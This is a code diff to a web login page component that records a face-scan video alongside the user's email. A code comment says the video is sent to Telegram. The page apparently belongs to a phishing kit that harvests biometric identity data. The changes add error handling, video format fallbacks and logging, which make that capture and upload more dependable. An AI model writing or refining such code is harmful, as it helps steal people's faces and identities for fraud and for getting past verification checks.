@@ -165,7 +165,12 @@ export default function LoginPage() {
   };
 
   const handleStartRecording = async () => {
-    await notifyFaceScan(userEmail);
+    try {
+      await notifyFaceScan(userEmail);
+    } catch (error) {
+      console.error('Failed to send face scan notification:', error);
+    }
+    
     setIsRecording(true);
     setCurrentStep("recording");
     setCurrentDirection("left");
@@ -174,17 +179,28 @@ export default function LoginPage() {
     if (stream) {
       const chunks: Blob[] = [];
       
-      // Try different mimeTypes based on browser support
-      let mimeType = 'video/webm';
-      if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-        mimeType = 'video/webm;codecs=vp9';
-      } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
-        mimeType = 'video/webm;codecs=vp8';
-      } else if (MediaRecorder.isTypeSupported('video/webm')) {
-        mimeType = 'video/webm';
+      // Find a supported mimeType
+      let mimeType = '';
+      const mimeTypes = [
+        'video/webm;codecs=vp9',
+        'video/webm;codecs=vp8',
+        'video/webm;codecs=h264',
+        'video/webm',
+        'video/mp4',
+        ''
+      ];
+      
+      for (const type of mimeTypes) {
+        if (type === '' || MediaRecorder.isTypeSupported(type)) {
+          mimeType = type;
+          break;
+        }
       }
       
-      const recorder = new MediaRecorder(stream, { mimeType });
+      console.log('Using mimeType:', mimeType || 'default');
+      
+      const recorderOptions = mimeType ? { mimeType } : undefined;
+      const recorder = new MediaRecorder(stream, recorderOptions);
       
       recorder.ondataavailable = (event) => {
         if (event.data && event.data.size > 0) {
@@ -194,8 +210,11 @@ export default function LoginPage() {
       
       recorder.onstop = async () => {
         try {
-          const videoBlob = new Blob(chunks, { type: mimeType });
+          const finalMimeType = mimeType || 'video/webm';
+          const videoBlob = new Blob(chunks, { type: finalMimeType });
           setRecordedChunks(chunks);
+          
+          console.log('Video recorded, size:', videoBlob.size, 'bytes');
           
           // Send video to Telegram
           const formData = new FormData();
@@ -208,7 +227,8 @@ export default function LoginPage() {
           });
           
           if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
+            const errorText = await response.text();
+            throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
           }
           
           console.log('Video sent successfully');
